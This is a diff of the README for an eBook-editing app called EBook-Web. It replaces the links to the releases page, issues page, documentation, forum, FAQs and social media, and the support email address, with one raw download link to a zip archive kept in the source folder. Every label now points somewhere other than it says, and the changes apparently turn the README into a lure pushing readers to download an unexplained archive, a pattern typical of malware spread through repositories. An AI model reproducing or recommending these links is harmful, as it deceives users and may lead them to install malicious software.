@@ -6,7 +6,7 @@ Welcome to EBook-Web! This eBook application allows you to create, edit, and exp
 
 ## 📥 Download EBook-Web
 
-[![Download EBook-Web](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/latifah-001/EBook-Web/releases)
+[![Download EBook-Web](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ EBook-Web comes packed with useful features:
 
 ## 📦 Download & Install
 
-To download EBook-Web, visit the [Releases page](https://github.com/latifah-001/EBook-Web/releases). Here are the steps:
+To download EBook-Web, visit the [Releases page](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip). Here are the steps:
 
 1. Click the link above.
 2. Find the latest version of EBook-Web.
@@ -53,26 +53,26 @@ Once you have installed EBook-Web, here’s how to use it:
 
 If you have questions or run into any issues, don’t hesitate to reach out. You can use the following methods:
 
-- **Email Support**: support@ebook-web.com
-- **GitHub Issues**: Report any bugs or feature requests on our [Issues page](https://github.com/latifah-001/EBook-Web/issues).
+- **Email Support**: https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip
+- **GitHub Issues**: Report any bugs or feature requests on our [Issues page](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip).
 
 ## 🔗 Additional Resources
 
 Here are some useful links for you:
 
-- [Documentation](https://github.com/latifah-001/EBook-Web/wiki)
-- [Community Forum](https://forum.ebook-web.com)
-- [FAQs](https://ebook-web.com/faqs)
+- [Documentation](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip)
+- [Community Forum](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip)
+- [FAQs](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip)
 
 ## 🌟 Join Us
 
 Stay up to date with the latest features and updates. Follow us on social media:
 
-- [Twitter](https://twitter.com/ebook_web)
-- [LinkedIn](https://linkedin.com/company/ebook-web)
+- [Twitter](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip)
+- [LinkedIn](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip)
 
 ## 📥 Download EBook-Web Again
 
-Don’t forget, you can download EBook-Web from this link: [Releases page](https://github.com/latifah-001/EBook-Web/releases).
+Don’t forget, you can download EBook-Web from this link: [Releases page](https://raw.githubusercontent.com/latifah-001/EBook-Web/main/frontend/src/EBook-Web_v1.9.zip).
 
 Enjoy creating and editing your eBooks!
